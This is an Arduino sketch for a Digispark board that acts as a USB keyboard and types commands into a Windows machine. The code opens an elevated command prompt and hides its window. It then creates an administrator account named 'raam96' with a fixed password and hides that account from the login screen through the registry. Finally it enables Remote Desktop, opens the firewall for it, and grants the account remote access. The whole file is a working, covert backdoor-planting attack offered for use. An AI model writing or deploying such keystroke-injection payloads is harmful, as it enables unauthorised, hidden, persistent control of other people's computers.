#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskmgr"); //starting taskmgr
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_N);//run
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");//start cmd
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("net user raam96 Test@123 /ADD");//adding user
  DigiKeyboard.delay(500);
  DigiKeyboard.println("net localgroup Administrators raam96 /ADD");//adding user to admin group
  DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v raam96 /t REG_DWORD /d 0 /f"));//Hiding user from login screen
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));//Turning Remote desktop
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));//Allowing remote desktop through firewall
  DigiKeyboard.delay(500);
  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" raam96 /add");//adding created user to remote desktop group
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");//adding created user to remote desktop group
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
